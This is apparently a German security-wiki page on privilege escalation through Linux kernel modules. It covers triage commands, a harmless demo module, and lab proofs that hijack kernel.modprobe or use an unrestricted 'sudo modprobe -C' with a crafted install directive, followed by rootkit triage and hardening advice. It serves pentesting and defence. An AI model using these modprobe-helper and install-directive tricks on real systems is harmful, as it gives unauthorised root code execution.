# Missbrauch von Kernelmodulen und modprobe

{{#include ../../banners/hacktricks-training.md}}

## Fehlkonfigurationen bei Kernelmodulen und dem Laden von Modulen

Die Unterstützung von Kernelmodulen ist ein Bereich mit hohem Risiko bei der Überprüfung einer Linux-Privilege-Escalation. Behandle nicht jede Meldung zu unsignierten Modulen automatisch als ausnutzbar, sondern nutze sie, um praktische Fragen zu beantworten.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Kann der aktuelle Benutzer Module über `sudo`, Capabilities oder einen beschreibbaren Hilfspfad laden?
- Ist das Laden von Modulen noch aktiviert?
- Ist die Erzwingung von Modulsignaturen deaktiviert?
- Sind Modulverzeichnisse, Moduldateien oder `modprobe.d`-Konfigurationspfade beschreibbar?<sup>[[16]](#references)</sup>
- Können Kernel-Logs gelesen werden, um zu bestätigen, was passiert ist?

Die erste Triage beginnt mit den folgenden Prüfungen des Modulstatus, der Signaturen, der Protokollierung und des Modulbaums.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretation:

- `modules_disabled=1` bedeutet, dass Module weder geladen noch entladen werden können und der Wert bis zum Neustart nicht auf `0` zurückgesetzt werden kann.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` in der Kernel-Befehlszeile oder `CONFIG_MODULE_SIG_FORCE=y` erfordert gültig signierte Module; andernfalls können unsignierte Module geladen werden und den Kernel als kompromittiert markieren.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` schränkt `dmesg` nicht ein; bei `1` ist für den Zugriff `CAP_SYSLOG` erforderlich.<sup>[[1]](#references)</sup>
- Beschreibbare Pfade unter `/lib/modules/$(uname -r)/` sind gefährlich, da `modprobe` beim Laden von Modulen diesen Verzeichnisbaum und dessen Abhängigkeitsdaten durchsucht.<sup>[[8]](#references)</sup>

### Ein Modul laden und die Kernel-Ausgabe lesen

Wenn du die legitime Berechtigung hast, ein lokales Modul zu laden, fügt `insmod` genau die von dir angegebene `.ko`-Datei ein. Die Init-Funktion des Moduls wird als Teil des Ladevorgangs ausgeführt, und mit `printk()` geschriebene Meldungen landen im Kernel-Logpuffer, der normalerweise mit `dmesg` ausgelesen wird.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Ein minimaler Prüfablauf verwendet `modinfo` zum Überprüfen der Metadaten, `insmod` und `rmmod` zum Laden und Entfernen eines Moduls, `lsmod` zur Bestätigung des Ladezustands und `dmesg` zum Überprüfen der Kernel-Protokolle.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Wenn `sudo -l` `insmod`, `modprobe` oder einen Wrapper dafür erlaubt, ist das als kritisch einzustufen: `sudo -l` listet die Berechtigungen des aufrufenden Benutzers auf, und zum Laden eines Kernelmoduls ist `CAP_SYS_MODULE` erforderlich. Siehe [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) für direkte Pfade über Capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### Durch sudo erlaubtes `insmod`

Eine sudo-Regel, die einem Benutzer erlaubt, `insmod` auszuführen, ist nicht mit der Erlaubnis vergleichbar, einen gewöhnlichen administrativen Helfer auszuführen. Der Initialisierungscode des Moduls wird beim Laden ausgeführt. Die praktische Prüffrage lautet daher, ob dieser Benutzer das zu ladende Modul auswählen oder ändern kann.<sup>[[3]](#references)</sup>

Der folgende allgemeine Prüfablauf wiederholt diese Prüfungen für ein Modul als Kandidaten: Untersuchung, Laden, Status, Protokoll und Entfernung.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Wenn der Benutzer eine beliebige `.ko` bereitstellen kann, sollte dies bei einer autorisierten Sicherheitsprüfung als vollständige Kompromittierung des Systems behandelt werden. Ein sichereres Vorgehen ist, das Laden von Modulen nicht über sudo zu delegieren. Ist dies unvermeidbar, sollten der genaue Pfad, der Eigentümer, die Berechtigungen, die Signaturrichtlinie und der Ablauf zum Entfernen eingeschränkt werden.<sup>[[3]](#references)[[10]](#references)</sup>

Für ein ungefährliches Muster zum Erstellen von Modulen in einer kontrollierten Laborumgebung werden unten ein minimales Quellprogramm und eine Makefile gezeigt. Die Form `make -C /lib/modules/$(uname -r)/build M=$PWD` entspricht dem dokumentierten kbuild-Workflow des Kernels für externe Module.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Nur in einem autorisierten Labor bauen und laden; kbuild erstellt das externe Modul, und die Lade- und Entfernungsbefehle rufen die Kernelmodulschnittstellen auf.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` auf Missbrauch prüfen

`kernel.modprobe` bezeichnet das Userspace-Hilfsprogramm, das der Kernel bei Anfragen zum automatischen Laden von Modulen ausführt. Dieser sysctl-Wert betrifft das automatische Laden, nicht das explizite Einfügen von Modulen. Kann ein Angreifer den Wert auf einen beschreibbaren ausführbaren Pfad ändern und eine Modulanfrage auslösen, wird dieses Hilfsprogramm zu einem privilegierten Codeausführungspfad. Wird der Wert auf eine leere Zeichenfolge gesetzt, werden Anfragen zum automatischen Laden deaktiviert. Wenn `CONFIG_STATIC_USERMODEHELPER=y` gesetzt ist, wird ein nicht leerer Wert durch den einkompilierten statischen Pfad des Hilfsprogramms überschrieben.<sup>[[1]](#references)</sup>

Prüfen Sie den aktuellen Pfad des Hilfsprogramms über die Kernel-sysctl-Schnittstelle und kontrollieren Sie Eigentümer und Berechtigungen des Ziels.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Prüfe, ob sysctl, delegierte sudo-Regeln oder Datei-Capabilities beeinflusst werden können.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Das folgende, nur für Labore vorgesehene Muster ändert den Pfad des Hilfsprogramms und löst eine dokumentierte Anfrage zum automatischen Laden eines Moduls aus; verwende es nur auf einem isolierten, autorisierten System.<sup>[[1]](#references)</sup>

Verwende auf aktuellen Linux-Kernels keine unbekannte ausführbare Datei als generischen Auslöser: Das automatische Laden von Modulen für benutzerdefinierte Binärformate aus älteren Linux-Versionen wurde mit Linux 6.14 entfernt, während die Kernel-Dokumentation einen unbekannten Dateisystemtyp als möglichen Auslöser für eine Anfrage zum automatischen Laden eines Moduls nennt.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Auf gehärteten Systemen sollte dies fehlschlagen, wenn Berechtigungen nicht privilegierten Benutzern Schreibzugriffe auf `kernel.modprobe` verwehren, der Pfad zum Helper nicht beschreibbar ist oder das automatische Laden von Modulen deaktiviert ist.<sup>[[1]](#references)</sup>

### Beschreibbare `modprobe.d`-Konfiguration und `sudo modprobe -C`

Vor dem Auflösen eines Moduls liest `modprobe` `.conf`-Dateien aus Konfigurationsverzeichnissen wie `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` und `/lib/modprobe.d` in der Reihenfolge ihrer Priorität. Eine gleichnamige Datei in einem Verzeichnis mit höherer Priorität überschattet die Datei mit niedrigerer Priorität. Noch wichtiger ist, dass eine `install <module> <command>`-Direktive einen beliebigen Shell-Befehl ausführt, **anstatt** das Modul einzufügen. Ein beschreibbarer Konfigurationspfad kann daher zu einer verzögerten Befehlsausführung mit den Berechtigungen eines späteren privilegierten `modprobe`-Aufrufers führen; die Durchsetzung von Kernel-Modulsignaturen authentifiziert diesen Userspace-Befehl nicht.<sup>[[16]](#references)</sup>

Überprüfe die Berechtigungen von Verzeichnissen und Dateien und untersuche anschließend die effektive Konfiguration. `modprobe -n -v` eignet sich sicher zur Überprüfung der Auflösung, da der Dry-Run-Modus weder das Modul einfügt noch einen `install`-/`remove`-Befehl ausführt. Verwende vorzugsweise `modprobe -c` statt der veralteten Schreibweise `--showconfig`, deren Entfernung nach kmod 36 in der aktuellen kmod-Dokumentation angekündigt ist.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Eine uneingeschränkte sudo-Regel für `modprobe` ist ausnutzbar, selbst wenn beliebige `.ko`-Dateien die Signaturprüfung nicht bestehen: Mit `-C` wird ein vom Angreifer kontrolliertes Konfigurationsverzeichnis ausgewählt, aus dem der vom sudo gestartete Prozess einen `install`-Befehl ausführen kann.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Zur Mitigation sollte `modprobe` nicht ohne Argumentbeschränkung über sudo freigegeben werden. Alle Konfigurationsverzeichnisse sollten root gehören und nicht beschreibbar sein. Unerwartete `install`-/`remove`-Anweisungen sollten überprüft werden. Wenn ein vertrauenswürdiger administrativer Ablauf solche Anweisungen für ein bestimmtes Modul umgehen muss, ignoriert `modprobe --ignore-install` sie für dieses Modul; Abhängigkeiten können jedoch weiterhin eigene Befehle haben.<sup>[[8]](#references)[[16]](#references)</sup>

### Überprüfung beschreibbarer `/lib/modules`-Verzeichnisse

Beschreibbare Modulverzeichnisse können den Austausch von Modulen, das Einschleusen bösartiger Module oder den Missbrauch des automatischen Ladens ermöglichen, je nachdem, wie `modprobe` später aufgerufen wird. Bei der Suche nach Modulen verwendet `modprobe` `/lib/modules/$(uname -r)` sowie die dortigen Abhängigkeitsdaten.<sup>[[8]](#references)</sup>

Überprüfen Sie beschreibbare Moduldateien sowie Abhängigkeits- und Alias-Metadaten im Modulbaum des aktiven Kernel-Releases.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Wenn du beschreibbaren Modulinhalt findest, untersuche, wie `modprobe` Abhängigkeiten auflöst und wie `modinfo` Modulmetadaten ausgibt.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Defensive Hinweise:

- Halte `/lib/modules` im Besitz von `root:root` und für Benutzer nicht beschreibbar.<sup>[[8]](#references)</sup>
- Setze `kernel.modules_disabled=1` nach dem Booten, sofern dies betrieblich möglich ist.<sup>[[1]](#references)</sup>
- Erzwinge die Signierung von Modulen auf Systemen, die ladbare Module benötigen.<sup>[[2]](#references)</sup>
- Überwache Schreibzugriffe auf `/proc/sys/kernel/modprobe`, `/lib/modules` und die Konfigurationsverzeichnisse von `modprobe.d` sowie unerwartete Ausführungen von `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Triage von modulbasierten Rootkits

Ein schädliches Modul kann Syscalls, VFS- oder `/proc`-Ansichten, Netzwerkpfade oder Berechtigungsprüfungen manipulieren, um Prozesse und Dateien zu verbergen, Datenverkehr umzuleiten oder Geheimnisse abzufangen. Es kann sich auch aus der von `lsmod` angezeigten Modulliste entfernen. Persistenz kann durch Aliase oder Installationsregeln in `modprobe.d`, `/etc/modules-load.d`, eine systemd-Unit, initramfs-Inhalte oder den Austausch einer legitimen `.ko`-Datei erreicht werden. Ein normales Ergebnis von `lsmod` ist ein nützlicher Hinweis, aber eine Kompromittierung auf Kernel-Ebene kann die vom Kernel bereitgestellten Listen unzuverlässig machen. Gleiche geladene Module, Dateien auf der Festplatte, Boot-Konfiguration, Modul-Ladeprotokolle und vertrauenswürdige externe Telemetrie miteinander ab.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Prüfe auf unerwartete Modulnamen, Pfade, Abhängigkeiten, Signaturen und Ladezeiten. Meldungen zu Kernel-Taint und unsignierten Modulen sind Hinweise, aber kein Beweis für ein rootkit. Wenn ein rootkit vermutet wird, sichere Beweise von einem vertrauenswürdigen Image oder aus einer Recovery-Umgebung, bevor du dich auf die Ausgabe des laufenden Kernels verlässt. Die Seite [Bewertung von Kernel-Schwachstellen](kernel-vulnerability-assessment.md) behandelt Konfiguration und diagnostische Offenlegung, darunter tracefs und angeheftete BPF-Objekte.

## References

- [1] [Dokumentation zu /proc/sys/kernel/ — Linux-Kernel-Dokumentation](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Signaturfunktion für Kernel-Module — Linux-Kernel-Dokumentation](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Grundlagen zu Treibern — Linux-Kernel-Dokumentation](https://docs.kernel.org/driver-api/basics.html)
- [6] [Nachrichtenprotokollierung mit printk — Linux-Kernel-Dokumentation](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Externe Module erstellen — Linux-Kernel-Dokumentation](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Merge-Tag „execve-v6.14-rc1“ — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
